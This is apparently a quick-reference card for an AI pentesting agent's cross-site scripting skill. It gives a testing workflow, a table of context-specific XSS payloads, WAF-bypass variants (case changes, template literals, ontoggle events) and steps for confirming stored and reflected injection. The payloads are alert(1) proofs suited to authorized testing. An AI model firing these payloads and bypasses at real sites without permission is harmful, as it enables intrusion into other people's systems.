# XSS Skill — Quick Reference Card

> Read this first. Load `SKILL.md` only if you need full technique detail.

## Workflow (3 Phases)
```
Phase 1: Reflection detection (find reflection points)
Phase 2: Context analysis + payload crafting
Phase 3: Stored/DOM confirmation (execution proof)
```

## Context → Payload Map
```
HTML body:         <img src=x onerror=alert(1)>
HTML attribute:    " onmouseover="alert(1)
JS string ('):     '-alert(1)-'
JS string ("):     "-alert(1)-"
URL param:         javascript:alert(1)
Template literal:  ${alert(1)}
```

## WAF Bypass First Attempts
- `<ScRiPt>alert(1)</ScRiPt>` — case variation
- `<img src=1 onerror=alert\`1\`>` — template literals
- `<details open ontoggle=alert(1)>` — non-script events
- Check waf_fingerprint.json for target-specific bypasses

## Stored vs Reflected
- Reflected: same session → inject → load same page → execute
- Stored: Session A injects → Session B loads page → Session B executes

## Stop Signals
- Reflection present but all HTML entities encoded → no XSS angle
- CSP blocks inline scripts → check if CSP bypassable (nonces, unsafe-eval)

## Result Format
```
Status: confirmed | negative | partial
Evidence: exact payload + proof of execution (screenshot if via browser)
```

> **Full skill:** `cat skills/xss/SKILL.md`
